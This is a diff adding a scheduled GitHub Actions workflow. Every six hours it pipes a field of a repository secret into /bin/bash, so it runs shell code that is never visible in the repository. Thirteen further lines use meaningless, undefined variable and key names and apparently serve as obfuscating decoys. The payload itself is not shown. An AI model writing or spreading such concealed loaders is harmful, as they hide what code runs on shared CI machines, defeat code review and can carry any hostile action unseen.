@@ -1,0 +1,30 @@
+name: xiaochangwuyang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaochangwuyang
+        env:
+          jef0478: ${{ secrets.jef0478 }}
+        run: |
+          echo $jef0478 | jq -r .vdt788 | /bin/bash
+          echo $iudgu6069 | jq -r .j931 | /bin/bash
+          echo $gynjs4 | jq -r .s7 | /bin/bash
+          echo $pzt96240 | jq -r .y092 | /bin/bash
+          echo $xg6 | jq -r .bhr0219 | /bin/bash
+          echo $trljp50435 | jq -r .o44968 | /bin/bash
+          echo $hhp41478 | jq -r .bk98402 | /bin/bash
+          echo $q5 | jq -r .dc92 | /bin/bash
+          echo $qgaeh448 | jq -r .hbl53418 | /bin/bash
+          echo $y417 | jq -r .cvcrd71405 | /bin/bash
+          echo $nmpj30595 | jq -r .x9672 | /bin/bash
+          echo $rer2 | jq -r .o91159 | /bin/bash
+          echo $onvp488 | jq -r .qlkfx7773 | /bin/bash
+          echo $uds10022 | jq -r .acmmb9 | /bin/bash
+
